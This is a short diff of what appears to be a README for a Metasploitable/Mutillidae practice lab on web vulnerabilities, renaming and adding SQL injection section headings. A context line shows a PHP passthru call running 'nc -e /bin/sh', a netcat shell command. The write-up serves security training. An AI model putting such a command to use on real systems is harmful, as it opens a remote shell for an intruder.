@@ -154,7 +154,7 @@ passthru("nc -e /bin/sh 8080");
 
 <h3 align="center"> ... </h3> 
 
-## SQL Injection Vulnerability
+## SQL Injection Vulnerability in LOGIN PAGES
 
 - to open run the mutillidae make sure that the setting is done in metaspoitable machine.
 ```
@@ -190,5 +190,9 @@ https://www.youtube.com/watch?v=tYmDiz0SPaw&feature=youtu.be
 >  ![image](https://github.com/stellados53/vulnerabilities-Metasploitable-/assets/142677726/47cd4466-c4d8-42e3-8a94-c68a29e4a548)
 >
 > __HIGH SECURITY__ : its not possible because its more secure.
+
+
+## SQL Injection Vulnerability - EXTRACTING DATA FROM DATABASE
+
 
 
